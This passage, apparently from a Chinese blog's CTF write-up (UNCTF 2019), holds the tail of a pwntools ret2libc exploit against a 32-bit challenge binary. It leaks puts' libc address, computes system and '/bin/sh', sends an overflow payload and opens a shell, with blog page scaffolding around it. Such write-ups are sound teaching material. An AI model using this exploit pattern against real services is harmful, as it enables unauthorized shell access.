puts_got<span class="token operator">=</span>u32<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"puts_got:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span><span class="token punctuation">)</span>

libc_base<span class="token operator">=</span>puts_got<span class="token operator">-</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"libc_base:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>

sys_addr<span class="token operator">=</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"sys_addr:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>sys_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>

sh_addr<span class="token operator">=</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"binsh_addr:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>sh_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>

sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"What is your name?"</span><span class="token punctuation">)</span>
payload3<span class="token operator">=</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x14</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>sys_addr<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>sh_addr<span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload3<span class="token punctuation">)</span>

sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<figure class="image-box">
                <img src="https://ae01.alicdn.com/kf/H40e854236162467fadefc95cc93de3ede.png" alt title class>
                <p></p>
            </figure>

<p>得到shell </p>
<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"live2d-widget-model-wanko"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false});</script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"live2d-widget-model-wanko"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false});</script>
      
    </div>
    <footer class="article-footer">
      <a data-url="http://Du4t.github.io/2019/10/26/unctf-wp/" data-id="ck3y8594r000w5gvt1j8bpp3g" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/WP/">WP</a></li></ul>

    </footer>
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2019/11/01/ru-he-xie-lou-pwn-zhong-de-yi-xie-xin-xi/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Newer</strong>
      <div class="article-nav-title">
        
          如何泄漏PWN中的一些信息
        
      </div>
    </a>
  
  
    <a href="/2019/10/11/zhan-yi-chu/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title">栈溢出漏洞及利用</div>
    </a>
  
</nav>

  
</article>

</section>
        
          <aside id="sidebar">
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">分类</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Others/">Others</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/PWN/">PWN</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/RE/">RE</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/WP/">WP</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">标签</h3>
    <div class="widget">
      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Others/">Others</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PWN/">PWN</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RE/">RE</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/WP/">WP</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">标签云</h3>
    <div class="widget tagcloud">
      <a href="/tags/Others/" style="font-size: 10px;">Others</a> <a href="/tags/PWN/" style="font-size: 20px;">PWN</a> <a href="/tags/RE/" style="font-size: 10px;">RE</a> <a href="/tags/WP/" style="font-size: 15px;">WP</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">归档</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">十二月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">十一月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">十月 2019</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">最新文章</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2019/12/08/kmp-suan-fa/">KMP算法</a>
          </li>
        
          <li>
            <a href="/2019/12/07/ji-yu-mou-ctf-ti-de-ge-shi-hua-zi-fu-chuan-lou-dong-zai-xue-xi/">基于某CTF题的格式化字符串漏洞再学习</a>
          </li>
        
          <li>
            <a href="/2019/11/28/njupt-ctf/">NJUPT_CTF-WP</a>
          </li>
        
          <li>
            <a href="/2019/11/16/rop-ji-zhu/">ROP技术</a>
          </li>
        
          <li>
            <a href="/2019/11/01/ru-he-xie-lou-pwn-zhong-de-yi-xie-xin-xi/">如何泄漏PWN中的一些信息</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      © 2019 Du4t<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  <script src="/fancybox/jquery.fancybox.pack.js"></script>


<script src="/js/script.js"></script>



  </div>
<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"live2d-widget-model-wanko"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false});</script>
<script type="text/javascript" charset="utf-8" src="/js/lazyload-plugin/lazyload.intersectionObserver.min.js"></script></body></html>